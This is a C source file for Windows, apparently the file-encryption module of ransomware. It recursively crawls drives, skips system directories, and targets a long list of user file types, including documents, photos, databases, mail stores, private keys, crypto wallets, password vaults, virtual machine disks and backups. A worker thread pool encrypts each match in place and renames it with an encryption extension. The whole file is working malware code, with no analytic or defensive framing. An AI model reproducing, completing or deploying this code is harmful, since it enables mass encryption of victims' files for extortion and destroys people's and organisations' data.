#include "fileops.h"
#include "crypto.h"
#include <stdio.h>
#include <string.h>
#include <shlobj.h>
#include <inttypes.h>

static bool IsTargetExtension(const char *path);

/* ── Stuff we skip (system dirs) ── */
static const char *g_skip[] = {
    "\\Windows", "\\System32", "\\SysWOW64",
    "\\Program Files", "\\Program Files (x86)",
    "\\AppData", "\\$Recycle.Bin", "\\Boot",
    "\\ProgramData\\Microsoft",
    NULL
};

/* ── Extensions we encrypt ── */
static const char *g_ext[] = {
    ".doc",".docx",".xls",".xlsx",".ppt",".pptx",".pps",".ppsx",
    ".pdf",".txt",".rtf",".csv",".tsv",
    ".jpg",".jpeg",".png",".gif",".bmp",".tif",".tiff",".raw",
    ".mp3",".mp4",".avi",".mkv",".wmv",".mov",".flv",".m4v",
    ".zip",".rar",".7z",".tar",".gz",".bz2",".xz",".zst",".iso", ".js",
    ".sql",".mdb",".accdb",".sqlite",".db",".mdf",".ldf",
    ".pst",".ost",".eml",".msg",".mbox",
    ".key",".pem",".cer",".crt",".pfx",".p12",
    ".vmx",".vmdk",".vhd",".vhdx",".vdi",".vbox",".ova",".ovf",
    ".bak",".old",".backup",".bkp",".dmp",".dump",
    ".cfg",".config",".conf",".ini",".inf",
    ".py",".java",".c",".cpp",".h",".hpp",".cs",".js",".ts",".vue",
    ".php",".asp",".aspx",".jsp",".rb",".go",".rs",".swift",".kt",
    ".html",".htm",".css",".xml",".json",".yaml",".yml",".md",
    ".psd",".ai",".svg",".dxf",".dwg",".cdr",
    ".wav",".flac",".aac",".ogg",".wma",
    ".vcf",".ics",".dbx",".wallet",".dat",
    ".log",".sav",".rdp",".vnc",
    ".gpg",".asc",".kdbx",".kdb",
    ".env",".gitconfig",".gitignore",
    ".ovpn",
    NULL
};

/* ==================================================================
 * INTERNAL CONTEXT
 * ================================================================== */
struct FILEOPS_CTX {
    FILEOPS_CONFIG    config;
    FILEOPS_STATS     stats;
    bool              statsInitialized;

    CRITICAL_SECTION  statsLock;

    /* Thread pool */
    HANDLE           *threads;
    DWORD             threadCount;

    /* Work queue */
    struct WorkItem {
        struct WorkItem *next;
        WCHAR   path[];              /* flexible array — zero-sized member */
    }                *queueHead;
    struct WorkItem **queueTail;
    volatile LONG     queueCount;

    /* Tracks number of workers currently executing a file */
    volatile LONG     activeWorkers;

    CRITICAL_SECTION  queueLock;
    CONDITION_VARIABLE queueNotEmpty;
    CONDITION_VARIABLE queueIdle;

    volatile LONG     shutdownFlag;
};

/* ── Thread pool worker ── */
static DWORD WINAPI WorkerThread(LPVOID lpParam) {
    FILEOPS_CTX *ctx = (FILEOPS_CTX *)lpParam;

    for (;;) {
        struct WorkItem *item = NULL;

        EnterCriticalSection(&ctx->queueLock);
        while (ctx->queueHead == NULL && !ctx->shutdownFlag) {
            if (ctx->queueCount == 0 && ctx->activeWorkers == 0) {
                WakeAllConditionVariable(&ctx->queueIdle);
            }
            SleepConditionVariableCS(&ctx->queueNotEmpty,
                                     &ctx->queueLock, INFINITE);
        }

        if (ctx->shutdownFlag && ctx->queueHead == NULL) {
            LeaveCriticalSection(&ctx->queueLock);
            break;
        }

        /* Dequeue head */
        item = ctx->queueHead;
        ctx->queueHead = item->next;
        if (ctx->queueHead == NULL) {
            ctx->queueTail = &ctx->queueHead;
        }
        InterlockedDecrement(&ctx->queueCount);
        InterlockedIncrement(&ctx->activeWorkers);
        LeaveCriticalSection(&ctx->queueLock);

        /* ── Process the file ── */
        char narrowPath[FILEOPS_MAX_PATH];
        int narrowLen = WideCharToMultiByte(CP_UTF8, 0,
                                            item->path, -1,
                                            narrowPath, sizeof(narrowPath),
                                            NULL, NULL);
        HeapFree(GetProcessHeap(), 0, item);
        item = NULL;

        if (narrowLen <= 0 || narrowLen >= (int)sizeof(narrowPath)) {
            EnterCriticalSection(&ctx->statsLock);
            ctx->stats.filesFailed++;
            LeaveCriticalSection(&ctx->statsLock);

            EnterCriticalSection(&ctx->queueLock);
            InterlockedDecrement(&ctx->activeWorkers);
            if (ctx->queueCount == 0 && ctx->activeWorkers == 0) {
                WakeAllConditionVariable(&ctx->queueIdle);
            }
            LeaveCriticalSection(&ctx->queueLock);
            continue;
        }

        /* ── EncryptSingleFileInternal logic ── */
        HANDLE hFile = INVALID_HANDLE_VALUE;
        BYTE  *buf   = NULL;
        BYTE  *plaintext = NULL;
        DWORD  bufSize = 0;
        bool   success = false;

        hFile = CreateFileA(narrowPath, GENERIC_READ, FILE_SHARE_READ,
                            NULL, OPEN_EXISTING,
                            FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            goto worker_done_file;
        }

        DWORD fs = GetFileSize(hFile, NULL);
        if (fs == INVALID_FILE_SIZE || fs < 1) {
            goto worker_done_file;
        }

        /* Use CRYPTO_REQUIRED_CAPACITY from crypto.h for correct buffer sizing:
         *   = fs + ENCRYPT_OVERHEAD(64) + AES_BLOCK_SIZE(16)
         *   = fs + 80
         * This accommodates: salt(16) + iv(16) + hmac(32) + padded ciphertext */
        bufSize = CRYPTO_REQUIRED_CAPACITY(fs);
        buf = (BYTE *)VirtualAlloc(NULL, bufSize,
                                   MEM_COMMIT | MEM_RESERVE,
                                   PAGE_READWRITE);
        if (!buf) goto worker_done_file;

        /* Read file into separate plaintext buffer (EncryptBuffer requires
         * non-overlapping plaintext and ciphertext buffers) */
        plaintext = (BYTE *)VirtualAlloc(NULL, fs,
                                         MEM_COMMIT | MEM_RESERVE,
                                         PAGE_READWRITE);
        if (!plaintext) goto worker_done_file;

        DWORD rd = 0;
        if (!ReadFile(hFile, plaintext, fs, &rd, NULL) || rd != fs) {
            goto worker_done_file;
        }

        CloseHandle(hFile);
        hFile = INVALID_HANDLE_VALUE;

        /* Encrypt: writes [salt(16) | iv(16) | hmac(32) | ciphertext(padded)]
         * into buf, total size returned in encLen */
        DWORD encLen = 0;
        CRYPTO_ERROR cerr = EncryptBuffer(GetCryptoCtx(),
                                          plaintext,     /* input plaintext      */
                                          rd,            /* plaintext length     */
                                          buf,           /* output ciphertext    */
                                          &encLen,       /* output length        */
                                          bufSize);      /* buffer capacity      */

        SecureZeroMemory(plaintext, fs);
        VirtualFree(plaintext, 0, MEM_RELEASE);
        plaintext = NULL;

        if (cerr != CRYPTO_SUCCESS) {
            goto worker_done_file;
        }

        /* ── Build temp path with overflow check ── */
        char tmpPath[FILEOPS_MAX_PATH];
        int tmpLen = snprintf(tmpPath, sizeof(tmpPath), "%s.tmp", narrowPath);
        if (tmpLen < 0 || tmpLen >= (int)sizeof(tmpPath)) {
            goto worker_done_file;
        }

        HANDLE hWrite = CreateFileA(tmpPath, GENERIC_WRITE, 0,
                                    NULL, CREATE_ALWAYS,
                                    FILE_ATTRIBUTE_NORMAL, NULL);
        if (hWrite == INVALID_HANDLE_VALUE) goto worker_done_file;

        DWORD wr = 0;
        BOOL writeOk = WriteFile(hWrite, buf, encLen, &wr, NULL);
        CloseHandle(hWrite);

        if (!writeOk || wr != encLen) {
            DeleteFileA(tmpPath);
            goto worker_done_file;
        }

        /* ── Atomic rename: .tmp → original ── */
        if (!MoveFileExA(tmpPath, narrowPath, MOVEFILE_REPLACE_EXISTING)) {
            DeleteFileA(tmpPath);
            goto worker_done_file;
        }

        /* ── Rename original → original.encrypted ── */
        char encPath[FILEOPS_MAX_PATH];
        int encLen2 = snprintf(encPath, sizeof(encPath), "%s%s",
                               narrowPath, ENC_EXT);
        if (encLen2 < 0 || encLen2 >= (int)sizeof(encPath)) {
            goto worker_done_file;
        }

        if (!MoveFileExA(narrowPath, encPath, MOVEFILE_REPLACE_EXISTING)) {
            goto worker_done_file;
        }

        /* ── Full success ── */
        success = true;
        EnterCriticalSection(&ctx->statsLock);
        ctx->stats.bytesProcessed += fs;
        ctx->stats.filesSucceeded++;
        LeaveCriticalSection(&ctx->statsLock);

    worker_done_file:
        if (!success) {
            EnterCriticalSection(&ctx->statsLock);
            ctx->stats.filesFailed++;
            ctx->stats.lastSystemError = GetLastError();
            LeaveCriticalSection(&ctx->statsLock);
        }

        if (buf) {
            SecureZeroMemory(buf, bufSize);
            VirtualFree(buf, 0, MEM_RELEASE);
        }
        if (plaintext) {
            SecureZeroMemory(plaintext, fs);
            VirtualFree(plaintext, 0, MEM_RELEASE);
        }
        if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);

        /* ── Decrement active workers and signal idle if appropriate ── */
        EnterCriticalSection(&ctx->queueLock);
        InterlockedDecrement(&ctx->activeWorkers);
        if (ctx->queueCount == 0 && ctx->activeWorkers == 0) {
            WakeAllConditionVariable(&ctx->queueIdle);
        }
        LeaveCriticalSection(&ctx->queueLock);
    }

    return 0;
}

/* ── Enqueue a single file ── */
static void EnqueueFile(FILEOPS_CTX *ctx, const WCHAR *fullPath) {
    size_t pathBytes = (wcslen(fullPath) + 1) * sizeof(WCHAR);

    /* Flexible array path[] is zero-sized — allocate exactly the bytes needed */
    struct WorkItem *item = (struct WorkItem *)
        HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,
                  sizeof(struct WorkItem) + pathBytes);
    if (!item) return;

    memcpy(item->path, fullPath, pathBytes);
    item->next = NULL;

    EnterCriticalSection(&ctx->queueLock);
    *ctx->queueTail = item;
    ctx->queueTail = &item->next;
    InterlockedIncrement(&ctx->queueCount);
    LeaveCriticalSection(&ctx->queueLock);

    WakeConditionVariable(&ctx->queueNotEmpty);
}

/* ── Internal recursive crawler (WCHAR) ── */
static void TraverseInternal(FILEOPS_CTX *ctx, const WCHAR *dir, int depth) {
    if (depth > MAX_DEPTH) return;

    if (ctx->config.pfnShouldSkip && ctx->config.pfnShouldSkip(dir))
        return;

    WCHAR pattern[FILEOPS_MAX_PATH];
    _snwprintf(pattern, FILEOPS_MAX_PATH - 1, L"%s\\*", dir);

    WIN32_FIND_DATAW fd;
    HANDLE hFind = FindFirstFileExW(pattern, FindExInfoStandard,
                                     &fd, FindExSearchNameMatch,
                                     NULL, 0);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (!wcscmp(fd.cFileName, L".") || !wcscmp(fd.cFileName, L".."))
            continue;

        WCHAR full[FILEOPS_MAX_PATH];
        int written = _snwprintf(full, FILEOPS_MAX_PATH - 1,
                                 L"%s\\%s", dir, fd.cFileName);
        if (written < 0 || written >= (int)(FILEOPS_MAX_PATH - 1))
            continue;

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            TraverseInternal(ctx, full, depth + 1);
        } else {
            char narrow[FILEOPS_MAX_PATH];
            if (WideCharToMultiByte(CP_UTF8, 0, full, -1,
                                    narrow, sizeof(narrow),
                                    NULL, NULL) <= 0)
                continue;

            if (!IsTargetExtension(narrow)) continue;

            char encPath[FILEOPS_MAX_PATH];
            int encLen = snprintf(encPath, sizeof(encPath), "%s%s",
                                  narrow, ENC_EXT);
            if (encLen < 0 || encLen >= (int)sizeof(encPath))
                continue;

            if (GetFileAttributesA(encPath) != INVALID_FILE_ATTRIBUTES)
                continue;

            EnqueueFile(ctx, full);
        }
    } while (FindNextFileW(hFind, &fd));

    FindClose(hFind);
}

/* ==================================================================
 * PUBLIC API
 * ================================================================== */

FILEOPS_CTX* FileOps_CreateContext(const FILEOPS_CONFIG* config) {
    FILEOPS_CTX *ctx = (FILEOPS_CTX *)
        HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(FILEOPS_CTX));
    if (!ctx) return NULL;

    if (config) {
        ctx->config = *config;
    } else {
        ctx->config.threadCount = FILEOPS_DEFAULT_THREADS;
        ctx->config.ioBufferSize = FILEOPS_IO_CHUNK;
        ctx->config.flags = FILEOPS_FLAG_RECURSIVE;
        ctx->config.extension[0] = L'\0';
         ctx->config.pfnShouldSkip = NULL;
    }

    if (ctx->config.threadCount < 1)
        ctx->config.threadCount = 1;
    if (ctx->config.threadCount > 128)
        ctx->config.threadCount = 128;

    ctx->queueTail = &ctx->queueHead;
    ctx->threadCount = ctx->config.threadCount;

    /* Initialise stats lock once (lazy-init guard is below) */
    InitializeCriticalSection(&ctx->statsLock);
    ctx->statsInitialized = true;

    InitializeCriticalSection(&ctx->queueLock);
    InitializeConditionVariable(&ctx->queueNotEmpty);
    InitializeConditionVariable(&ctx->queueIdle);

    /* Spawn worker threads */
    ctx->threads = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,
                              sizeof(HANDLE) * ctx->threadCount);
    if (!ctx->threads) {
        DeleteCriticalSection(&ctx->statsLock);
        DeleteCriticalSection(&ctx->queueLock);
        HeapFree(GetProcessHeap(), 0, ctx);
        return NULL;
    }

    for (DWORD i = 0; i < ctx->threadCount; i++) {
        HANDLE h = CreateThread(NULL, 0, WorkerThread, ctx, 0, NULL);
        if (h) {
            ctx->threads[i] = h;
        }
    }

    return ctx;
}

void FileOps_TraverseAndQueue(FILEOPS_CTX* ctx, const WCHAR* rootPath) {
    if (!ctx || !rootPath) return;
    TraverseInternal(ctx, rootPath, 0);
}

bool FileOps_ProcessSingleFile(FILEOPS_CTX* ctx, const WCHAR* filePath) {
    if (!ctx || !filePath) return false;

    char narrow[FILEOPS_MAX_PATH];
    if (WideCharToMultiByte(CP_UTF8, 0, filePath, -1,
                            narrow, sizeof(narrow), NULL, NULL) <= 0)
        return false;

    if (!IsTargetExtension(narrow)) return false;

    EnqueueFile(ctx, filePath);
    return true;
}

void FileOps_WaitForCompletion(FILEOPS_CTX* ctx) {
    if (!ctx) return;

    EnterCriticalSection(&ctx->queueLock);
    while (ctx->queueCount > 0 || ctx->activeWorkers > 0) {
        /* If queue is empty and no active workers, we're done.
         * Otherwise wait for the conditional variable. */
        if (ctx->queueCount == 0 && ctx->activeWorkers == 0)
            break;
        SleepConditionVariableCS(&ctx->queueIdle,
                                 &ctx->queueLock, INFINITE);
    }
    LeaveCriticalSection(&ctx->queueLock);
}

void FileOps_GetStats(FILEOPS_CTX* ctx, FILEOPS_STATS* outStats) {
    if (!ctx || !outStats) return;

    EnterCriticalSection(&ctx->statsLock);
    *outStats = ctx->stats;
    LeaveCriticalSection(&ctx->statsLock);
}

void FileOps_DestroyContext(FILEOPS_CTX* ctx) {
    if (!ctx) return;

    /* Signal shutdown */
    InterlockedExchange(&ctx->shutdownFlag, 1);
    WakeAllConditionVariable(&ctx->queueNotEmpty);

    /* Wait for threads to exit */
    for (DWORD i = 0; i < ctx->threadCount; i++) {
        if (ctx->threads[i]) {
            WaitForSingleObject(ctx->threads[i], INFINITE);
            CloseHandle(ctx->threads[i]);
        }
    }

    /* Drain any remaining work items */
    struct WorkItem *item = ctx->queueHead;
    while (item) {
        struct WorkItem *next = item->next;
        HeapFree(GetProcessHeap(), 0, item);
        item = next;
    }

    HeapFree(GetProcessHeap(), 0, ctx->threads);
    DeleteCriticalSection(&ctx->statsLock);
    DeleteCriticalSection(&ctx->queueLock);
    HeapFree(GetProcessHeap(), 0, ctx);
}

/* ── Should skip system directories ── */
static bool ShouldSkip(const WCHAR* path) {
    char narrow[FILEOPS_MAX_PATH];
    if (!WideCharToMultiByte(CP_UTF8, 0, path, -1,
                              narrow, sizeof(narrow), NULL, NULL))
        return false;

    for (int i = 0; g_skip[i]; i++) {
        /* Simple case-insensitive substring check */
        char *found = strstr(narrow, g_skip[i]);
        if (found) return true;
    }
    return false;
}

/* ── Is target extension? ── */
static bool IsTargetExtension(const char* path) {
    if (!path) return false;
    const char *dot = strrchr(path, '.');
    if (!dot) return false;

    for (int i = 0; g_ext[i]; i++) {
        if (_stricmp(dot, g_ext[i]) == 0)
            return true;
    }
    return false;
}

/* ── Global config & context (simplified high-level API) ── */
static FILEOPS_CTX *g_ctx = NULL;

bool InitFileOps(int threadCount) {
    if (g_ctx) return true;

    FILEOPS_CONFIG cfg = {0};
    cfg.threadCount = (threadCount > 0) ? (DWORD)threadCount : FILEOPS_DEFAULT_THREADS;
    cfg.flags = FILEOPS_FLAG_RECURSIVE;
    cfg.pfnShouldSkip = ShouldSkip;

    g_ctx = FileOps_CreateContext(&cfg);
    return (g_ctx != NULL);
}

void CleanupFileOps(void) {
    if (g_ctx) {
        FileOps_WaitForCompletion(g_ctx);
        FileOps_DestroyContext(g_ctx);
        g_ctx = NULL;
    }
}

bool EncryptSingleFile(const char *narrowPath) {
    if (!g_ctx || !narrowPath) return false;

    /* Convert to wide */
    WCHAR wide[FILEOPS_MAX_PATH];
    int wlen = MultiByteToWideChar(CP_UTF8, 0, narrowPath, -1,
                                    wide, FILEOPS_MAX_PATH);
    if (wlen <= 0) return false;

    if (!FileOps_ProcessSingleFile(g_ctx, wide))
        return false;

    FileOps_WaitForCompletion(g_ctx);

    FILEOPS_STATS stats;
    FileOps_GetStats(g_ctx, &stats);
    return (stats.filesSucceeded > 0 && stats.filesFailed == 0);
}

int EncryptDirectory(const char *narrowPath) {
    if (!g_ctx || !narrowPath) return 0;

    WCHAR wide[FILEOPS_MAX_PATH];
    int wlen = MultiByteToWideChar(CP_UTF8, 0, narrowPath, -1,
                                    wide, FILEOPS_MAX_PATH);
    if (wlen <= 0) return 0;

    FileOps_TraverseAndQueue(g_ctx, wide);
    FileOps_WaitForCompletion(g_ctx);

    FILEOPS_STATS stats;
    FileOps_GetStats(g_ctx, &stats);
    return (int)(stats.filesSucceeded + stats.filesFailed);
}
